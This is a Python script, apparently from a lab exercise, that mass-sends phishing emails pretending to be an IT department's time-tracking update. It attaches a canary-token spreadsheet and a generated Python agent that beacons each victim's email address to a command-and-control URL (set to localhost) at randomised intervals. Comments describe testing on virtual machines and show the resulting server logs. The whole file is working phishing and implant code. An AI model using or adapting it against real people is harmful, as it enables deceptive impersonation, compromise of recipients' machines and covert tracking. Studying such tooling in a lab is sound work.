import pandas as pd
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


C2_SERVER_URL = 'http://127.0.0.1/log'
payload=["email.csv", "Software_Tracking_List.xlsx"]

"""
For this script I am assuming that when the payload is executed and downloaded on the target machine, my C2 server will recieve POST requests from the target machine.
I randomized the timing of the POST requests coming from the target machine between 1-60 seconds.
In addition to this, I included a canary token (Software_Tracking_List.xlsx) in the email which will send me an email alert if the Excel sheet is downloaded.
Lastly I created a python file that when ran will report back to the C2 server that the agent is online. For the python script, this is what I imagine would be under the hood of the executable where the 
agent installed through the .exe would periodically be sent back to the C2.

"""

def read_email(username, password):
    df = pd.read_csv('./email.csv')
    emails = df['Email'].tolist()
    for email in emails:
        try:
            python_payload(email)
            msg = craft_email(username, email, payload)
            send_email(username, password, email, msg)
            
            #log_agent_presence(email)           
        except Exception as e:
            print(f"Failed to craft email: {e}")
    

def craft_email(username, email, payload):
    
    sender = username
    recipient = email
    subject = 'Time Tracking System Update'
    body = f'''
    Good morning,
    
    Please see the downloadable as we have currently updated the Time Entry Platform. 
    
    Once the download is complete please download and list your name on the excel sheet attached. Please let us know if you have any recommendations for this new software!
    
    Thanks,
    IT Department    
    '''
    
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    # Open the payload as a binary
    for file in payload:
        with open(file, "rb") as file_attachment:
            attachment = MIMEBase("application", "octet-stream")
            attachment.set_payload(file_attachment.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f"attachment; filename= {file}")
            msg.attach(attachment)
        
    return msg
        

def send_email(username, password, email, msg):
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    try:  
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(username, password)
            server.send_message(msg)
        print(f"Email sent successfully to {email}!")
    except Exception as e:
        print(f"Failed to send email: {e}")


def python_payload(email):
    
    #log_agent_presence(email)      
    code = f"""
import requests
import time
import random
C2_SERVER_URL = 'http://127.0.0.1/log'
email = '{email}'
def log_agent_presence(email):
    while True:    
        try:
            # Send a request to the C2 server to log the agent's presence
            response = requests.post(C2_SERVER_URL, json={{'agent_id': email, 'status': 'online'}})        
            if response.status_code == 200:
                print("Agent presence logged successfully.")
            else:
                print(f"Failed to log agent presence. Status code: {{response.status_code}}")
            random_sleep = random.randint(1, 60)
            time.sleep(random_sleep) 
        except Exception as e:
            print(f"Error connecting to C2 server: {{e}}")
def main():
    log_agent_presence(email)
if __name__ == "__main__":
    main()
                
"""
    filename = f'{email}_agent_logger.py'
    with open(filename, 'w') as file:
        file.write(code)    
        payload.append(filename)

        
        
def main():
    username = input("Enter your gmail that you will be sending the email from: ")
    password = input("Enter your password: ")

    read_email(username, password)
    
    

"""
On 2 VMs I accessed different test emails to download and run the python script.
Example logs collected from my server showing alerts that were generated: 

Agent ben1234@icloud.com is online.
10.0.0.132 - - [05/Nov/2024 10:41:46] "POST /log HTTP/1.1" 200 -
Agent ben.1234@gmail.com is online.
10.0.0.152 - - [05/Nov/2024 12:53:29] "POST /log HTTP/1.1" 200 -

"""


art = r"""
 ____                                  __                           
/\  _`\                               /\ \__  __                    
\ \ \/\ \     __    ___     __   _____\ \ ,_\/\_\    ___     ___    
 \ \ \ \ \  /'__`\ /'___\ /'__`\/\ '__`\ \ \/\/\ \  / __`\ /' _ `\  
  \ \ \_\ \/\  __//\ \__//\  __/\ \ \L\ \ \ \_\ \ \/\ \L\ \/\ \/\ \ 
   \ \____/\ \____\ \____\ \____\\ \ ,__/\ \__\\ \_\ \____/\ \_\ \_\
    \/___/  \/____/\/____/\/____/ \ \ \/  \/__/ \/_/\/___/  \/_/\/_/
                                   \ \_\                            
                                    \/_/                                                             
"""


if __name__ == "__main__":
    print(art)
    main()